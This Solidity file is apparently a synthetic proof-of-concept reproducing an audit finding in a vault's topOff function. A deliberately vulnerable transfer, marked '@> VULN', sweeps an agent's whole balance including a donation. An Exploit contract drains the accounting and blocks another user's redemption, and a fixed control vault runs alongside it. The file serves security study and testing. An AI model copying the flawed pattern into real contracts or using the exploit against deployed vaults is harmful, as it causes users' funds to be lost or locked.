// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  OmoVault.topOff — a donation inflates agentBalance (Pashov, finding 53314).
    SYNTHETIC, cheatcode-free reduction.
    Root cause: topOff pulls the agent's whole balance and subtracts that from
    _totalAssets. Bob donates 20 on top of the 20 the agent already holds for
    his redeem. Bob is paid 40, _totalAssets falls from 40 to 0, and Alice's
    redeem of 20 underflows. The control pulls record.assets (20) instead.
    Blamed transfers preserved (@> VULN). */

contract MockERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        allowance[from][msg.sender] -= amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract OmoAgent {
    mapping(uint256 => address) public agents;

    function setAgent(uint256 id, address who) external {
        agents[id] = who;
    }
}

contract SettlementAgent {
    function arm(MockERC20 asset, address vault) external {
        asset.approve(vault, type(uint256).max);
    }

    function settle(OmoVault vault) external {
        vault.topOff();
    }
}

contract Sink {}

contract OmoVault {
    struct Record {
        address receiver;
        uint256 assets;
    }

    MockERC20 public asset;
    OmoAgent public account;
    bool public immutable useRecord;
    uint256 public totalAssets;
    Record public record;
    uint256 public constant ALICE = 20 ether;
    uint256 public constant BOB = 20 ether;

    constructor(MockERC20 a, OmoAgent account_, bool useRecord_) {
        asset = a;
        account = account_;
        useRecord = useRecord_;
        totalAssets = ALICE + BOB;
    }

    function setRecord(address receiver, uint256 assets) external {
        record = Record(receiver, assets);
    }

    function topOff() external {
        require(address(account) != address(0), "NO_REGISTERED_ACCOUNT");
        OmoAgent agentAccount = account;
        require(agentAccount.agents(0) == msg.sender, "UNAUTHORIZED_AGENT");
        if (!useRecord) {
            uint256 agentBalance = asset.balanceOf(msg.sender);
            // @> VULN: the whole agent balance, donation included, is swept and subtracted
            asset.transferFrom(msg.sender, address(this), agentBalance);
            asset.transfer(record.receiver, agentBalance);
            totalAssets -= agentBalance;
        } else {
            asset.transferFrom(msg.sender, address(this), record.assets);
            asset.transfer(record.receiver, record.assets);
            totalAssets -= record.assets;
        }
    }

    function redeem(address to, uint256 assets) external {
        totalAssets -= assets;
        asset.transfer(to, assets);
    }
}

contract Exploit {
    MockERC20 public asset; // nonce 1
    OmoAgent public account; // nonce 2
    SettlementAgent public agent; // nonce 3
    OmoVault public vault; // nonce 4
    OmoAgent public controlAccount; // nonce 5
    SettlementAgent public controlAgent; // nonce 6
    OmoVault public control; // nonce 7
    Sink public alice; // nonce 8

    bool public aliceReverted;
    uint256 public aliceStuck;
    uint256 public bobReceived;
    uint256 public controlAlicePaid;
    uint256 public controlLeft;

    constructor() {
        asset = new MockERC20();
        account = new OmoAgent();
        agent = new SettlementAgent();
        vault = new OmoVault(asset, account, false);
        controlAccount = new OmoAgent();
        controlAgent = new SettlementAgent();
        control = new OmoVault(asset, controlAccount, true);
        alice = new Sink();
        account.setAgent(0, address(agent));
        controlAccount.setAgent(0, address(controlAgent));
        vault.setRecord(address(this), 20 ether);
        control.setRecord(address(controlAgent), 20 ether);
        asset.mint(address(vault), 20 ether);
        asset.mint(address(agent), 20 ether);
        asset.mint(address(this), 20 ether);
        asset.mint(address(control), 20 ether);
        asset.mint(address(controlAgent), 40 ether);
    }

    function run() external {
        asset.transfer(address(agent), 20 ether);
        agent.arm(asset, address(vault));
        agent.settle(vault);
        bobReceived = asset.balanceOf(address(this));
        require(bobReceived == 40 ether, "bob was not paid 40");
        require(vault.totalAssets() == 0, "totalAssets was not wiped");
        try vault.redeem(address(alice), 20 ether) {
            revert("alice redeemed");
        } catch {
            aliceReverted = true;
        }
        aliceStuck = asset.balanceOf(address(vault));
        require(aliceReverted, "alice redeem did not revert");
        require(aliceStuck == 20 ether, "alice assets did not stay");

        controlAgent.arm(asset, address(control));
        controlAgent.settle(control);
        controlLeft = control.totalAssets();
        require(controlLeft == 20 ether, "control wiped totalAssets");
        control.redeem(address(alice), 20 ether);
        controlAlicePaid = asset.balanceOf(address(alice));
        require(controlAlicePaid == 20 ether, "control did not pay alice");
        require(asset.balanceOf(address(control)) == 0, "control vault not empty");
    }
}
